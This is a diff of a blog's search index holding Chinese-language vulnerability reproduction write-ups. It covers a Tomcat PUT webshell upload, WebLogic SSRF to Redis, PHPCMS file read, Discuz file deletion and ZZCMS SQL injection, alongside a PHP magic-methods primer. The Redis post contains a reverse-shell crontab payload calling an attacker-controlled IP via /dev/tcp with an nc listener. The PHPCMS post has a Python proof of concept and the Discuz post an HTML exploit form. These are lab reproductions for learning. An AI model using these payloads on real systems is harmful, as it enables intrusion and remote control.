+    <url>%2F2018%2F06%2F19%2FCVE-2017-12615-Tomcat%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[0x01 漏洞复现本次复现的漏洞如题，是一个任意文件文件上传漏洞，但是此处的上传不需要页面有一个上传功能的界面，而是通过PUT方法来进行上传的。在tomcat下的conf文件夹中有一个web.xml，在其中找到default servlet的配置项，添加如下的配置 重点是readonly的那一项，因为其他的都是默认的，只有那个是自己添加的。 我们来看一下readonly这个选项是用来做什么的吧 也是在这个web.xml文件中，已经注释的地方说明了默认情况下readonly是true，并且如果是true的话，那么PUT和DELETE方法是被拒绝的，因此如果手动将readonly选项开启为false，那么就能够通过PUT方法上传文件了。 但是，当我们想要上传一个jsp木马的时候却发现报了一个405的错误 查阅资料发现，原来default servlet只能处理静态文件，而处理jsp文件是jspservlet，但是只有defaultservlet有PUT上传逻辑，解决的办法是通过构造特殊的后缀名来进行绕过，从而上传jsp木马。 经过验证，可以在文件名后面添加斜杠 / 来进行绕过。 访问上传的木马，成功执行命令！]]></content>
+      <categories>
+        <category>漏洞分析与复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>Tomcat</tag>
+        <tag>任意文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[利用WebLogic SSRF漏洞攻击内网Redis反弹shell]]></title>
+    <url>%2F2018%2F06%2F19%2F%E5%88%A9%E7%94%A8WebLogic-SSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91Redis%E5%8F%8D%E5%BC%B9shell%2F</url>
+    <content type="text"><![CDATA[0x01 复现环境公网上存在WebLogic服务，存在SSRF漏洞内网中部署了一台Redis服务器，IP地址为172.21.0.2，端口6379反弹shell需要自己的公网IP总计两个公网IP，一个内网IP 0x02 WebLogic SSRF漏洞WebLogic的SSRF漏洞算是一个比较知名的SSRF漏洞，具体原理可以自行谷歌。本篇主要是通过复现该漏洞来加深对SSRF漏洞的理解。 首先访问WebLogic的漏洞页面地址为1http://xxx.xxx.xxx.xxx:xxxx[这个是WebLogic服务的IP]/uddiexplorer/SearchPublicRegistries.jsp?operator=http://xxx.xxx.xxx.xxxx[这个是想要探测的内网IP]&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search 那么SSRF利用中，大部分第一步肯定是进行内网的端口探测了，当然肯定有IP和端口的探测了，这里内网IP已经给出了，就直接扫端口了，简单的写了一个扫描脚本而已 扫端口得到内网Redis端口为6379，当然这是做实验所以服务是知道的，在实际过程中肯定需要进一步判断的，不过一般都是默认端口吧。。。 这次访问一下6379端口，看看页面如何 看到了下面的一个报错，其实从这个报错就可以判断这个内网Redis服务是存在的，为什么呢？看一下2016乌云大会上猪猪侠师傅介绍的《WebLogic SSRF 服务探测》 我们得到的页面的报错语句刚好符合请求开放的服务的回显，OK，第一步完成 0x03 攻击内网Redis反弹shell在Weblogic的SSRF中，有一个比较大的特点，就是虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 第一步探测Redis我们已经完成了，那么第二部就是发送redis命令，将弹shell脚本写入/etc/crontab中，crontab就是linux下的一个定时执行事件的一个程序，不懂的小伙伴可以自行谷歌 命令如下：1set 1 &quot;\n\n\n\n* * * * root bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx[这里是你自己的公网IP]/8888[这里是你监听的端口] 0&gt;&amp;1\n\n\n\n&quot; config set dir /etc/config set dbfilename crontab save 因为我们是通过GET来发送命令的，因此要将上面的命令进行URL编码，同时我们还要制定一个要写入的文件，这里我就叫做test了，最终的URL如下：1?operator=http://172.21.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 在自己的公网IP上监听8888端口1nc -l 8888 然后发送请求即可反弹shell了 如果burp的右边出现了你输入的命令的回响，那么证明你发送的命令已经被服务器接受了 反弹shell成功！]]></content>
+      <categories>
+        <category>漏洞分析与复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>Redis</tag>
+        <tag>SSRF</tag>
+        <tag>WebLogic</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[深入浅出PHP中的魔术方法]]></title>
     <url>%2F2018%2F06%2F10%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E4%B8%AD%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%2F</url>
     <content type="text"><![CDATA[0x01 引子PHP的魔术方法在反序列化漏洞利用中是十分常见的，因此对于深入理解反序列化漏洞来说，理解PHP中常见的魔术方法也是至关重要的，所以在学习php.net文档中的魔术方法后，写篇文章来总结一下。 0x02 __wakeup()和__sleep()在PHP的序列化与反序列化中wakeup()和sleep()这两个魔术方法是必须到知道的。sleep函数是在序列化的时候会被自动调用，而wakeup函数则实在反序列化的时候被调用，对应的序列化的函数是serialize()，而反序列化函数是unserialize()。 那么如何理解自动调用呢？举个例子，在学习其他面向对象语言，例如java，c++的时候，一定听说过construct函数，一般叫做构造函数，构造函数就是当类被实例化的时候会首先执行构造函数，因此sleep和wakeup两个函数也是类似的，当php进行序列化或者反序列化的时候就会执行sleep或者wakeup函数了。 说完自动调用再来细说一下这两个魔术方法吧。首先是__sleep()函数，sleep函数的原型如下 意味着在写该函数的时候要注意需要有一个返回值，并且该返回值的类型是一个数组，而数组的内容是需要被序列化的变量名称，但是如果你没有这个返回值，PHP会报一个N_NOTICE的错误（就是一个警告），并把NULL给序列化了，举个例子看下图： 无返回值结果我们可以看到爆了一个警告，并且在第二行有个N;，这个就是就是NULL被序列化的结果。 有返回值![]/images/深入浅出PHP中的魔术方法4.png)结果 然后就是__wakeup()函数了wakeup函数原型如下 好吧，没什么好说的，就是当执行unserialize()的时候会执行该魔术方法啦。 0x03 __toString()__toString()魔术方法看名字也能懂，就是当对象被当作字符串来使用的时候会调用该魔术方法。什么叫做把对象当作字符串呢？就比如说echo $obj;这样的，我把一个对象echo出来，那么就会调用这个魔术方法啦。 在PHP5.2.0版本之前呢，只有直接使用echo和print才会生效，但是现在什么年代了，5.2.0几乎没有了，所以我们一般只要记得在任何字符串环境都可以的。 __toString()的原型如下： 这个也是有返回值的，不过返回值的类型是String类型的，因此我们在定义该函数的时候一定要记得返回一个字符串。 然后有一点需要记得那就是不能在toString方法中抛出错误，否则会报error的。那么有的同学一定会问什么是抛出错误了，回答一下就是throw一个error了，博主亲自做了实验，还真的会报错。 0x04 __invoke()invoke也是一个比较常用的函数，当对象是用调用函数的方式来使用的时候就会调用invoke魔术方法。那么什么是用调用函数的方式来使用呢？举个例子，一般我们写一个函数，比如function hello($string){….}这么写，然后想要调用这个函数的话就会hello(“hello”)这么来调用，因此呢，把对象使用函数的方式调用就是$obj($string)这样，括号里面是参数，当然也可以没有。obj是一个new好的对象，这样子就会自动调用invoke魔术方法啦。（PS.只有在PHP5.3.0版本以上才有的，当然现在基本都是这个版本以上了吧） 0x05 PHP“重载”系列接下来要总结的是PHP的“重载”系列的魔术方法了。那么细心的小伙伴一定发现我在重载两个字上打了双引号。这是因为在PHP中，重载跟我们以前在java或者c++中见到的重载不太一样。在c++中，重载是指函数名字一样，但是参数和类型是不一样的，但是在PHP中，重载的意思是动态地“创建”类属性和方法。机智的小伙伴发现这里又有双引号了，好吧，这里的创建的意思包括读取和设置两种意思。 那么在PHP中什么时候使用重载呢？答案就是当调用当前环境下未定义或不可见的属性和方法的时候，会调用重载方法。那么现在一定有小伙伴会问，未定义我们可以理解，那什么是不可见的属性和方法呀，这里解释一下，不可见的属性和方法就比如一个变量是private的，那么我在别的类中就无法访问这个变量了，对于别的类中，这个private变量就是不可见吧，那么我访问了这个private变量，就会调用重载方法啦。 现在该正式开始介绍“重载”系列的魔术方法啦。__get()、__set()、__isset()、__unset() 当我们想要读取未定义或不可见属性的时候会自动调用get当我们想要设置未定义或不可见属性的时候会自动调用set当我们对未定义或不可见属性使用isset()或者empty()时会自动调用isset当我们对未定义或不可见属性使用unset()时会自动调用unset __call、__callstatic 当我们调用一个不可访问的方法的时候会自动调用call当我们调用一个不可访问的静态方法的时候会自动调用callstatic（注意访问静态方法的时候使用“类名::方法名”的方式哦~） 0x06 __clone()当我们复制一个对象的时候，会用到clone这个关键字，当复制完成后，会自动调用clone魔术方法。 0x07 参考http://php.net/]]></content>
@@ -226,8 +353,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>小贴士</tag>
         <tag>Ubuntu</tag>
+        <tag>小贴士</tag>
       </tags>
   </entry>
   <entry>
@@ -238,8 +365,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>小贴士</tag>
         <tag>Ubuntu</tag>
+        <tag>小贴士</tag>
       </tags>
   </entry>
   <entry>
@@ -259,12 +386,12 @@
     <url>%2F2018%2F06%2F10%2FZZCMSV8-2SQL%E6%B3%A8%E5%85%A5%2F</url>
     <content type="text"><![CDATA[0x01 漏洞分析本次漏洞发生在/user/del.php中，首先，这里的pagename和tablename可以看到都是通过POST方法传进来的，但是只是用trim函数简单的处理了一下，之后也没有任何过滤的手段了，因此是一个比较简单的sql注入了。 在后面的112行将tablename带入到了sql语句中查询，并且tablename变量并没有用单引号包裹，可以直接发挥各种姿势。 0x02 漏洞利用这里有几点需要注意的是，在自己测试的时候需要注意zzcms_main中一定要有数据，否则的话会不成功的 payload大概如下，这里用的是盲注 放一下我的python利用代码： 效果：]]></content>
       <categories>
-        <category>漏洞分析</category>
+        <category>漏洞分析与复现</category>
       </categories>
       <tags>
+        <tag>漏洞复现</tag>
         <tag>漏洞分析</tag>
         <tag>PHP</tag>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -272,12 +399,12 @@
     <url>%2F2018%2F06%2F10%2F9%2F</url>
     <content type="text"><![CDATA[0x01 漏洞分析首先本次漏洞的问题函数不在于某一处函数或者语句，而是在与多方面的因素共同作用，最终可以进行绕过从而进行任意文件读取。在phpcms中，有一个file_down函数用来下载文件的，该函数位于/phpcms/libs/functions/global.func.php 该函数就是一个正常的文件下载的函数，而调用这个函数的地方位于phpcms\modules\content\down.php 这里我们从下往上分析，首先调用file_down函数的fileurl参数中的&lt;&gt;被替换成空，往上看发现fileurl是当变量m存在时，变量s与之前的fileurl进行拼接而来的，再往上看发现之前的fileurl是变量f，因此我们要下载的文件参数是通过变量s和变量f拼接而来的！继续向上看，发现有一个parse_str($a_k)，因此变量s和变量f是通过parse_str解析a_k变量来的，而a_k变量是通过get方式接收的，因此可控！所以就有风险了。 不过我们能够发现，变量a_k在传进来之后，被传入到了一个sys_auth函数重新赋值了，这个函数是phpcms中一个用来加解密的函数，位于/phpcms/libs/functions/global.func.php 这里通过pc_auth_key变量的密钥进行解密。 到目前为止我们需要的是一个使用pc_auth_key密钥，通过sys_auth函数加密过的a_k变量，并且其中的s和f变量是我们可控的，从而才能通过解析出来后拼接，然后带入到file_down函数下载任意文件。 幸运的是，就在down.php中的init函数可以满足这个条件 可以看到在init函数的后边，就有一个将a_k变量同pc_auth_key进行加密，并且之后传入了download函数123$pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).$_SERVER[&apos;HTTP_USER_AGENT&apos;].&apos;down&apos;);$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &apos;ENCODE&apos;, $pc_auth_key));$downurl = &apos;?m=content&amp;c=down&amp;a=download&amp;a_k=&apos;.$a_k; 然后我们来从头看一下init函数。首先通过get方式接受参数a_k，然后将这个a_k变量进行解密，然后通过safe_replace函数进行过滤，然后通过parse_str进行解析，从而得到了s变量和f变量。所以这一阶段我们就需要一个加密过的a_k然后传给init函数。这里用到了之前phpcms的一个sql注入的利用方式，在位于/phpcms/modules/attachment/attachments.php 的swfupload_json()函数，代码如下： 这里主要看一下src参数，这里src参数通过get方式接收之后用trim函数去除首尾的空白符，然后通过过safe_replace函数进行过滤，之后通过arr数组进行json编码，后面出入到了set_cookie函数中，而这个函数位于/phpcms/libs/classes/param.class.php，代码如下： 可以看到进入后会通过for循环遍历数组，然后src的值会被sys_auth加密！现在我们可以回过头看一下之前一直被提到的safe_replace函数的作用吧，代码位于/phpcms/libs/functions/global.func.php，代码如下： 发现是将敏感符号替换为空，这个绕过就很好绕过了，比如当我们想输入单引号的时候%27，我们只要在其中加入一个位于黑名单的符号就可以了，比如%2;7，分号会被检测到然后替换成空，剩下了%27即为单引号了。 既然刚才在swfupload_json函数中找到了我们想要的结果，那么我们就看一下attachments类的构造函数，看看调用这个swfuplaod_json函数需要什么条件吧 函数最下面如果userid为空，会调用showmessage函数，那样程序会被中断的，因此就必须要userid有数据，那么往上看1$this-&gt;userid = $_SESSION[&apos;userid&apos;] ? $_SESSION[&apos;userid&apos;] : (param::get_cookie(&apos;_userid&apos;) ? param::get_cookie(&apos;_userid&apos;) : sys_auth($_POST[&apos;userid_flash&apos;],&apos;DECODE&apos;)); 上述语句是关键以seesion方式接收userid参数，当$_SESSION[‘userid’]有数据时，返回$_SESSION[‘userid’]，当为空时，进行判断：静态调用param类的get_cookie函数，并给该函数传递_userid字符串，如果返回不为空执行param::get_cookie(‘_userid’)，如果为空就执行sys_auth($_POST[‘userid_flash’],’DECODE’))sys_auth函数在这里进行解密操作，将用post方式接收到的userid_flash参数值，放进sys_auth函数进行解密session是在服务器端生成的，在不能登录的情况下，session中的userid是空的，因此就会执行get_cookie函数，该函数代码如下 ![](/images/PHPCMSv9.6.1任意文件读取漏洞14.png） 其中有sys_auth的解密操作，而如果get_cookie没结果也得DECODE，所以说这里decode是一个必须的操作，不过好消息是decode的目标是我们可以控制的，要么是cookie中的cookie_pre_userid，要么是post过去的userid_flash参数这里以cookie为例，如果我们需要一个通过set_cookie的加密过的cookie，让它传送到这里，然后就可以通过get_cookie进行解密，从而绕过这里的限制 这里用wap模块的一个地方，代码位于/phpcms/modules/wap/index.php 通过第9行调用set_cookie函数，就可以生成一个加密好的cookie了。 0x02 总线这次漏洞分析大概就是以寻找加密解密来进行分析的，总结了一下流程，如下 至此分析结束，下面设计一下poc 0x03 POC123456789101112131415161718192021222324import requestsurl_1 = &quot;http://127.0.0.1:8080/code_audit/phpcmsv9.6.1/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1&quot;r_g = requests.get(url_1)for cookie in r_g.cookies: if &apos;_siteid&apos; in cookie.name: userid = cookie.value print &quot;siteid: &quot; + userid + &quot;\n&quot;url_2 = &quot;http://127.0.0.1:8080/code_audit/phpcmsv9.6.1/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D.p%25253chp&quot;# ?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad=x&amp;i=1&amp;modelid=1&amp;catid=1&amp;d=1&amp;m=1&amp;s=index&amp;f=.p%253chpdata_1 = &#123;&apos;userid_flash&apos;: userid&#125;r_p = requests.post(url = url_2, data= data_1)for cookie in r_p.cookies: if &apos;_att_json&apos; in cookie.name: att_json = cookie.value print &quot;att_json: &quot; + att_json + &quot;\n&quot;key = &quot;http://127.0.0.1:8080/code_audit/phpcmsv9.6.1/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=&quot; + att_jsonprint key 0x04 演示运行脚本]]></content>
       <categories>
-        <category>漏洞分析</category>
+        <category>漏洞分析与复现</category>
       </categories>
       <tags>
+        <tag>漏洞复现</tag>
         <tag>漏洞分析</tag>
         <tag>PHP</tag>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -297,12 +424,12 @@
     <url>%2F2018%2F06%2F10%2FDiscuz%E5%B0%8F%E4%BA%8E3.3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%2F</url>
     <content type="text"><![CDATA[0x01 前言之前网上爆的的是Discuz！&lt;=3.4的任意文件删除漏洞，为什么这里变成3.3了呢？因为厂商已经把3.4的修复了，不过3.3版本还是存在问题的。 0x02 漏洞复现首先，在本地创建一个我们要删除的测试文件 注册一个账号 然后点击保存，用burp抓个包，就可以得到我们的formhash，并在birthprovince中修改成我们要删除的文件路径(../../../test.txt) 然后可以在本地创建一个文件上传的表单1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://127.0.0.1:8080/code_audit/Discuz_X3.3_SC_UTF8/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;birthprovince&quot; id=&quot;file&quot; /&gt; &lt;input type=&quot;text&quot; name=&quot;formhash&quot; value=&quot;a7ccdf77&quot;/&gt; &lt;input type=&quot;text&quot; name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/from&gt;&lt;/body&gt;&lt;/html&gt; 然后点击上传 就完成了删除文件了~![](/images/Discuz3.3任意文件删除漏洞7.png 0x03 漏洞分析这里漏洞出现在/upload/source/include/spacecp/spacecp_profile.php 这里第182、183行有两个unlink()函数可以删除文件，但是需要formtype=file才可以，我们把这里的打印出来 发现并不是file，因此不能在这里进行删除，继续往下看， 第229行有一个unlink()函数，并且没有任何判断，也就是说只要程序运行到这里，就可以删除文件。看一下条件1@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]); 这里向上回溯，看一下$space[$key]在哪里。 出现在第23行，发现这个就是用户的个人设置，我们可以选择birthprovince，修改成要删除的文件就好了，然后实现一个上传文件 的表单，就可以删除文件了。]]></content>
       <categories>
-        <category>漏洞分析</category>
+        <category>漏洞分析与复现</category>
       </categories>
       <tags>
+        <tag>漏洞复现</tag>
         <tag>漏洞分析</tag>
         <tag>PHP</tag>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -313,8 +440,8 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>提权</tag>
+        <tag>Linux</tag>
         <tag>后渗透</tag>
       </tags>
   </entry>
